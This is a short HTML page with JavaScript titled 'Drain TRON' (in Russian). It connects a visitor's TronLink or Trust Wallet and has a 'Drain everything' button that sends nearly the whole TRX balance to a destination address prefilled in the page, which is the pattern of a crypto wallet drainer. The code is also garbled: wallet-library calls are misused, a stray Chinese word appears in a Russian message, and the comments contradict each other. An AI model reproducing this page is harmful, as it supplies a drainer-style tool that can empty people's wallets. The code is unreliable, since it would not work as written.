<!DOCTYPE html>
<html>
<head>
    <title>Слив TRON</title>
    <style>
        body { font-family: sans-serif; max-width: 400px; margin: 20px auto; padding: 20px; background: #f0f0f0; text-align: center; }
        .card { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        input, select { width: 100%; padding: 10px; margin: 5px 0 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; margin: 5px 0; background: #16a355; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
        button:disabled { background: #ccc; }
        #log { background: #eee; padding: 10px; font-size: 12px; text-align: left; margin-top: 10px; border-radius: 5px; max-height: 150px; overflow-y: auto; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🚀 Слив TRX / USDT</h2>
        <p style="font-size: 12px; color: #666;">Нужно расширение TronLink или открыть внутри Trust Wallet</p>
        
        <input type="text" id="safeAddr" placeholder="Адрес сейфа (T...)">
        <input type="text" id="myAddr" value="TWanTomGkHcNWhCVrYkohnuYkbBRKZLere" placeholder="Куда слить">
        
        <button id="btnConnect" onclick="connectTron()">1. Подключить кошелек</button>
        <button id="btnDrain" onclick="drain()" disabled>2. Слить всё</button>
        
        <div id="log">Ожидание...</div>
    </div>

    <!-- Подключаем библиотеку, но лучше используем ту, что встроена в TronLink -->
    <script src="https://cdn.jsdelivr.net/npm/tronweb@6.0.1/dist/tronweb.min.js"></script>

    <script>
        let tron = null;
        let accounts = [];
        const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const log = document.getElementById('log');

        function write(msg) {
            log.innerHTML = `<div>${msg}</div>` + log.innerHTML;
        }

        async function connectTron() {
            try {
                // Пытаемся взять TronWeb из расширения (TronLink/TrustWallet)
                if (window.tronWeb) {
                    tron = window.tronWeb;
                } else {
                    // Если расширения нет, пробуем создать свой (нужен для обычного браузера)
                    tron = new TronWeb({
                        fullHost: 'https://api.trongrid.io'
                    });
                    write("Нет TronLink! Подключите расширение.");
                }

                const account = await tron.getAccount(tron.address.decode(tron.fullNode)); // Проверка сессии
                
                if (window.tronWeb) {
                     accounts = await tron.getAccounts();
                } else {
                     write("Вставьте адрес в Trust/TronLink");
                }
                
                if (accounts.length > 0) {
                    document.getElementById('btnConnect').innerText = "✅ Кошелек: " + tron.address.decode(accounts[0]).substring(0,6) + "...";
                    document.getElementById('btnConnect').disabled = true;
                    document.getElementById('btnDrain').disabled = false;
                    write("Кошелек подключен!");
                }

            } catch (e) {
                write("Ошибка: " + e.message);
            }
        }

        async function drain() {
            const safe = document.getElementById('safeAddr').value;
            const to = document.getElementById('myAddr').value;
            
            if (!safe || !to) return write("Заполните адреса!");

            write("Проверка余额...");
            
            // Баланс TRX
            try {
                const txs = await tron.contract.at(safe).methods.balanceOf(accounts[0]).call(); // Примерный вызов
                
                // Простой баланс TRX (без контракта)
                const balanceTRX = await tron.trx.getBalance(safe);
                write(`TRX на сейфе: ${(balanceTRX/1000000).toFixed(4)}`);
                
                if (balanceTRX > 3000000) {
                    write("Перевод TRX...");
                    // Отправляем TRX
                    // Важно: если сейф != твой кошелек, нужен execTransaction. 
                    // Если сейф = твой кошелек (и ты просто его не видел), пойдет transfer.
                    let txid;
                    try {
                         const res = await tron.trx.sendTrx(accounts[0], to, balanceTRX - 2000000, {feeLimit: 10000000});
                         txid = res[0];
                    } catch (e) {
                         // Пытаемся отправить от имени сейфа (если сейф это твой кошелек)
                         // Но у нас нет приватного ключа сейфа (он мульти).
                         // Значит перевод делаем только с TВОЕГО кошелька на сейф? Нет, с сейфа на твой.
                         // Для мульти-сейфа скрипт сложнее.
                         write("Нужен приватный ключ сейфа или права Owner.");
                    }
                    
                    if (txid) write(`✅ Отправлено! <a href="https://tronscan.org/#/transaction/${txid}">Ссылка</a>`);
                } else {
                    write("Мало TRX на газ (нужно 3+)");
                }

            } catch (e) {
                write("Ошибка: " + e.message);
            }
        }
    </script>
</body>
</html>
